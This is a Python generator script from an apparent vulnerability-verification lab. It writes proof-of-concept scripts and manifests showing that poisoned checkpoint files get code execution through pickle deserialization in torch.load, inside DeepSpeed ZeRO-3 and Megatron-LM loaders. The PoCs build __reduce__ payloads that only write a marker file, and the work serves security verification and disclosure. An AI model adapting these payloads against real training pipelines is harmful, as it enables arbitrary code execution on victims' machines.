"""One-off generator: promote torch.load mining candidates to dynamic cases.

Writes manifest.json + poc.py for the DeepSpeed ZeRO-3 and Megatron-LM
checkpoint-loader candidates.  Run once, then delete.
"""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
CASES = ROOT / "lab" / "upstream_verify" / "cases"


DS_POC = '''"""{case_id} dynamic reproduction (DeepSpeed v0.19.8 ZeRO-3 checkpoint loader).

The pinned upstream ``deepspeed/runtime/zero/stage3.py`` is executed verbatim.
Only the DeepSpeed package tree around it is stubbed (no CUDA, no MSVC, Windows
host) through ``lab.upstream_verify.stublib``; ``torch`` is the real installed
build and the sink is the real upstream ``torch.load`` call with an explicit
``weights_only=False``.

Vulnerable path: whoever can write ``zero/optimizer_state.pt`` (or the
per-parameter ``<key>.pt`` files) inside a ZeRO-3 universal checkpoint
directory controls the pickle that ``{function}`` deserialises.

Proof: unpickling the checkpoint writes the marker file through a reducing
payload, i.e. code execution happens inside ``torch.load``.
"""

from __future__ import annotations

import collections
import json
import math
import os
import pickle
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402

CASE_LINE = {line}
CASE_KIND = {kind!r}


class _StateDict(dict):
    """dict that manufactures the keys the loader expects after unpickling."""

    def __getitem__(self, key):
        if key not in self:
            dict.__setitem__(self, key, {{"state": [{{"step": 1}}], "param_groups": [{{}}]}})
        return dict.__getitem__(self, key)


def _materialize(marker_path: str, marker_text: str, output):
    """Runs inside torch.load(); this is the code-execution primitive."""
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return output


class _Payload:
    def __init__(self, marker_path: str, marker_text: str, output):
        self.marker_path = marker_path
        self.marker_text = marker_text
        self.output = output

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text, self.output))


def main() -> None:
    import torch

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {{source}}")

    tree = StubTree(["deepspeed"]).install()
    partition = tree.seed(
        "deepspeed.runtime.zero.partition_parameters",
        torch=torch,
        math=math,
        os=os,
        collections=collections,
        defaultdict=collections.defaultdict,
    )
    tree.seed_leaks("deepspeed.runtime.zero.partition_parameters", source)
    tree.seed(
        "deepspeed.comm",
        get_rank=lambda group=None: 0,
        get_world_size=lambda group=None: 1,
    )
    module = tree.load(source, "uv_deepspeed_stage3")
    if not hasattr(module, "DeepSpeedZeroOptimizer_Stage3"):
        poclib.fail("upstream stage3 module did not expose DeepSpeedZeroOptimizer_Stage3")

    poclib.start_marker("ABSENT")
    marker = str(poclib.MARKER_FILE)
    text = poclib.MARKER_TEXT

    work = poclib.EVIDENCE_DIR / "ckpt"
    if work.exists():
        import shutil

        shutil.rmtree(work)
    zero = work / "zero"
    zero.mkdir(parents=True)

    cls = module.DeepSpeedZeroOptimizer_Stage3
    optimizer = object.__new__(cls)

    if CASE_KIND == "optimizer_state":
        payload = _Payload(marker, text, _StateDict())
        (zero / "optimizer_state.pt").write_bytes(pickle.dumps(payload, protocol=4))
        optimizer.fp16_groups = []
        optimizer.fp32_partitioned_groups_flat = []
        optimizer.fp16_partitioned_groups_flat = []
        optimizer.fp16_partitioned_groups = []
        optimizer.param_names = {{}}
        optimizer.swap_optimizer = False
        optimizer.optimizer = types.SimpleNamespace(param_groups=[])
        optimizer.loss_scaler = None
        optimizer.dynamic_loss_scale = None
        optimizer.overflow = False
        checkpoint_target = work
    else:
        payload = _Payload(marker, text, torch.zeros(8, dtype=torch.float32))
        (zero / "exp_avg.pt").write_bytes(pickle.dumps(payload, protocol=4))
        optimizer.dp_process_group = None
        checkpoint_target = zero

    sink_error = None
    result = None
    try:
        if CASE_KIND == "optimizer_state":
            result = optimizer.load_hp_checkpoint_state_from_checkpoint_dir_stage3(str(checkpoint_target))
        else:
            result = optimizer.load_hp_checkpoint_state(str(checkpoint_target), "exp_avg")
    except Exception as exc:  # the sink has already run at this point
        sink_error = f"{{type(exc).__name__}}: {{exc}}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written by the upstream torch.load sink", sink_error=sink_error)

    poclib.finish_verified(
        {{
            "transport": {{
                "type": "function+torch.load",
                "entrypoint": "deepspeed.runtime.zero.stage3.DeepSpeedZeroOptimizer_Stage3.{function}",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink_line": CASE_LINE,
                "sink": {snippet},
                "torch_version": torch.__version__,
                "checkpoint_file": poclib.rel(zero / "{filename}"),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": sink_error,
                "result_type": type(result).__name__,
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            }},
            "request_response": [
                {{
                    "dir": "untrusted checkpoint dir -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written before any state validation",
                }}
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }}
    )


if __name__ == "__main__":
    main()
'''

DS_CASES = [
    {
        "id": "deepspeed-stage3-py-torch-load-any-l3660-regex",
        "line": 3660,
        "kind": "optimizer_state",
        "filename": "optimizer_state.pt",
        "function": "load_hp_checkpoint_state_from_checkpoint_dir_stage3",
        "snippet": "optim_sd = torch.load(optim_state_path, weights_only=False)",
        "rule": "torch-load-any",
    },
    {
        "id": "deepspeed-stage3-py-torch-load-unsafe-l3660-regex",
        "line": 3660,
        "kind": "optimizer_state",
        "filename": "optimizer_state.pt",
        "function": "load_hp_checkpoint_state_from_checkpoint_dir_stage3",
        "snippet": "optim_sd = torch.load(optim_state_path, weights_only=False)",
        "rule": "torch-load-unsafe",
    },
    {
        "id": "deepspeed-stage3-py-torch-load-unsafe-l3660-ast",
        "line": 3660,
        "kind": "optimizer_state",
        "filename": "optimizer_state.pt",
        "function": "load_hp_checkpoint_state_from_checkpoint_dir_stage3",
        "snippet": "optim_sd = torch.load(optim_state_path, weights_only=False)",
        "rule": "torch-load-unsafe",
    },
    {
        "id": "deepspeed-stage3-py-torch-load-any-l3770-regex",
        "line": 3770,
        "kind": "hp_state",
        "filename": "exp_avg.pt",
        "function": "load_hp_checkpoint_state",
        "snippet": 'ckpt_dict = torch.load(os.path.join(folder, f"{key}.pt"), weights_only=False)',
        "rule": "torch-load-any",
    },
    {
        "id": "deepspeed-stage3-py-torch-load-unsafe-l3770-ast",
        "line": 3770,
        "kind": "hp_state",
        "filename": "exp_avg.pt",
        "function": "load_hp_checkpoint_state",
        "snippet": 'ckpt_dict = torch.load(os.path.join(folder, f"{key}.pt"), weights_only=False)',
        "rule": "torch-load-unsafe",
    },
]

DS_NOTES = (
    "Explicit torch.load(weights_only=False) inside the ZeRO-3 universal-checkpoint loader: any actor "
    "able to write the checkpoint directory gets pickle code execution when the victim resumes. "
    "Reproduced at function level against the verbatim pinned stage3.py; the DeepSpeed package tree is "
    "stubbed (no CUDA/MSVC on this Windows host) while torch is the real installed build."
)


MG_POC = '''"""{case_id} dynamic reproduction (Megatron-LM core_v0.19.2 checkpoint loader).

The pinned upstream ``megatron/training/checkpointing.py`` is executed verbatim;
``megatron.*`` siblings and the filesystem facade ``maybe_msc`` are stubbed via
``lab.upstream_verify.stublib`` because megatron-core 0.19.x cannot be imported
on a Windows/CPU host (its MoE ops hard-import ``triton``).  ``torch`` is real,
and the sink is the real upstream ``torch.load(checkpoint_name,
map_location='cpu')`` call, which does not pin ``weights_only`` - so torch 2.5.x
deserialises arbitrary pickle.

Vulnerable path: a checkpoint directory whose ``latest_checkpointed_iteration.txt``
points at an attacker-supplied ``iter_*/mp_rank_00/model_optim_rng.pt`` pickle.
"""

from __future__ import annotations

import glob
import json
import os
import pickle
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402

CASE_ENTRY = {entry!r}


class _Store(dict):
    """state dict that answers the keys the loader asks for."""

    def __missing__(self, key):
        value = {{"state": [{{"step": 1}}], "param_groups": [{{}}]}}
        dict.__setitem__(self, key, value)
        return value


def _materialize(marker_path: str, marker_text: str, output):
    """Runs inside torch.load(); this is the code-execution primitive."""
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return output


class _Payload:
    def __init__(self, marker_path: str, marker_text: str, output):
        self.marker_path = marker_path
        self.marker_text = marker_text
        self.output = output

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text, self.output))


def _mpu() -> types.SimpleNamespace:
    return types.SimpleNamespace(
        get_data_parallel_rank=lambda: 0,
        get_pipeline_model_parallel_world_size=lambda: 1,
        get_tensor_model_parallel_rank=lambda: 0,
        get_pipeline_model_parallel_rank=lambda: 0,
        get_expert_model_parallel_world_size=lambda: 1,
        get_expert_model_parallel_rank=lambda: 0,
        get_data_parallel_world_size=lambda: 1,
    )


def main() -> None:
    import torch

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {{source}}")

    tree = StubTree(["megatron"]).install()
    tree.seed(
        "megatron.core.msc_utils",
        maybe_msc=types.SimpleNamespace(
            open=open,
            Path=Path,
            os=os,
            makedirs=os.makedirs,
            glob=glob.glob,
        ),
    )
    tree.seed("megatron.core", mpu=_mpu())
    tree.seed("megatron.training")
    module = tree.load(source, "megatron.training.checkpointing")

    poclib.start_marker("ABSENT")
    marker = str(poclib.MARKER_FILE)
    text = poclib.MARKER_TEXT

    root = poclib.EVIDENCE_DIR / "checkpoint"
    if root.exists():
        import shutil

        shutil.rmtree(root)
    (root / "iter_0000001" / "mp_rank_00").mkdir(parents=True)
    (root / "latest_checkpointed_iteration.txt").write_text("1", encoding="utf-8")
    ckpt_file = root / "iter_0000001" / "mp_rank_00" / "model_optim_rng.pt"

    torch.distributed.get_rank = lambda *a, **k: 0
    torch.distributed.barrier = lambda *a, **k: None

    sink_error = None
    result = None
    if CASE_ENTRY == "load_biencoder_checkpoint":
        (ckpt_file).write_bytes(
            pickle.dumps(_Payload(marker, text, {{"model": [types.SimpleNamespace()]}}), protocol=4)
        )
        module.get_args = lambda: types.SimpleNamespace(load=str(root), use_distributed_optimizer=False)
        module.unwrap_model = lambda model: model
        model = [types.SimpleNamespace(load_state_dict=lambda state: None)]
        try:
            result = module.load_biencoder_checkpoint(model, custom_load_path=str(root))
        except Exception as exc:
            sink_error = f"{{type(exc).__name__}}: {{exc}}"
    else:
        (ckpt_file).write_bytes(
            pickle.dumps(_Payload(marker, text, _Store()), protocol=4)
        )
        args = types.SimpleNamespace(
            non_persistent_global_ckpt_dir=None,
            non_persistent_ckpt_type=None,
            ckpt_step=None,
            exit_on_missing_checkpoint=False,
            ckpt_format="torch",
            use_megatron_fsdp=False,
        )
        try:
            result = module._load_base_checkpoint(str(root), args, rank0=True)
        except SystemExit as exc:
            sink_error = f"SystemExit({{exc.code}})"
        except Exception as exc:
            sink_error = f"{{type(exc).__name__}}: {{exc}}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written by the upstream torch.load sink", sink_error=sink_error)

    poclib.finish_verified(
        {{
            "transport": {{
                "type": "function+torch.load",
                "entrypoint": "megatron.training.checkpointing.{entry}",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink": "torch.load(checkpoint_name, map_location='cpu')  # weights_only unpinned",
                "torch_version": torch.__version__,
                "checkpoint_file": poclib.rel(ckpt_file),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": sink_error,
                "result_type": type(result).__name__,
                "version_pair_note": "torch 2.5.1 keeps weights_only=False by default; torch>=2.6 blocks this pickle",
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            }},
            "request_response": [
                {{
                    "dir": "untrusted checkpoint dir -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written inside torch.load",
                }}
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }}
    )


if __name__ == "__main__":
    main()
'''

MG_CASES = [
    {
        "id": "megatron-checkpointing-py-torch-load-any-l1739-regex",
        "line": 1739,
        "entry": "_load_base_checkpoint",
        "function": "_load_base_checkpoint",
        "rule": "torch-load-any",
    },
    {
        "id": "megatron-checkpointing-py-torch-load-any-l2796-regex",
        "line": 2796,
        "entry": "load_biencoder_checkpoint",
        "function": "load_biencoder_checkpoint",
        "rule": "torch-load-any",
    },
]

MG_NOTES = (
    "torch.load(checkpoint_name, map_location='cpu') with no weights_only pin inside the Megatron-LM "
    "checkpoint loader: a poisoned checkpoint directory executes pickle code on resume. Reproduced "
    "against the verbatim pinned checkpointing.py; megatron.* siblings stubbed because megatron-core "
    "0.19.x hard-imports triton, torch is real 2.5.1+cpu where weights_only still defaults to False."
)


def load_manifest(case_id: str) -> tuple[Path, dict]:
    for path in CASES.glob("*/*/manifest.json"):
        if path.parent.name == case_id:
            return path.parent, json.loads(path.read_text(encoding="utf-8"))
    raise SystemExit(f"manifest not found for {case_id}")


def write(case_dir: Path, manifest: dict, code: str) -> None:
    (case_dir / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=1), encoding="utf-8"
    )
    (case_dir / "poc.py").write_text(code, encoding="utf-8")
    print("wrote", case_dir.name)


def main() -> None:
    for case in DS_CASES:
        case_dir, manifest = load_manifest(case["id"])
        code = DS_POC.format(
            case_id=case["id"],
            line=case["line"],
            kind=case["kind"],
            function=case["function"],
            snippet=repr(case["snippet"]),
            filename=case["filename"],
        )
        manifest.update(
            {
                "title": f"deepspeed: {case['rule']} @ stage3.py:{case['line']}",
                "status": "verified",
                "method": "dynamic-function",
                "module": "deepspeed-checkpoint-rce",
                "python": "reproenv",
                "preconditions": [
                    "attacker can write the ZeRO-3 universal checkpoint directory",
                    "victim resumes training with load_optimizer_states for that checkpoint",
                ],
                "steps": [
                    "load the verbatim pinned stage3.py with the DeepSpeed tree stubbed",
                    "place a pickled reducing payload at the path the loader reads",
                    "call the real loader method and observe marker creation inside torch.load",
                ],
                "expected_evidence": [
                    "marker written by the pickle before any state validation",
                    "run.json + log.txt with source hash and post-sink error",
                ],
                "cleanup": "temporary checkpoint directory under evidence/ is rewritten on every run",
                "notes": DS_NOTES,
                "static_verdict": "verified-dynamic",
            }
        )
        manifest["root_cause"]["note"] = DS_NOTES
        manifest["root_cause"]["function"] = case["function"]
        write(case_dir, manifest, code)

    for case in MG_CASES:
        case_dir, manifest = load_manifest(case["id"])
        code = MG_POC.format(case_id=case["id"], entry=case["entry"])
        manifest.update(
            {
                "title": f"megatron: {case['rule']} @ checkpointing.py:{case['line']}",
                "status": "verified",
                "method": "dynamic-function",
                "module": "megatron-checkpoint-rce",
                "python": "torch",
                "preconditions": [
                    "attacker can write the Megatron checkpoint directory",
                    "victim resumes training or loads a biencoder checkpoint from it",
                    "torch < 2.6 (weights_only defaults to False)",
                ],
                "steps": [
                    "load the verbatim pinned checkpointing.py with megatron siblings stubbed",
                    "write a poisoned model_optim_rng.pt plus the iteration tracker",
                    "call the real loader and observe marker creation inside torch.load",
                ],
                "expected_evidence": [
                    "marker written inside torch.load",
                    "run.json + log.txt with source hash",
                ],
                "cleanup": "temporary checkpoint directory under evidence/ is rewritten on every run",
                "notes": MG_NOTES,
                "static_verdict": "verified-dynamic",
            }
        )
        manifest["root_cause"]["note"] = MG_NOTES
        manifest["root_cause"]["function"] = case["function"]
        write(case_dir, manifest, code)


if __name__ == "__main__":
    main()



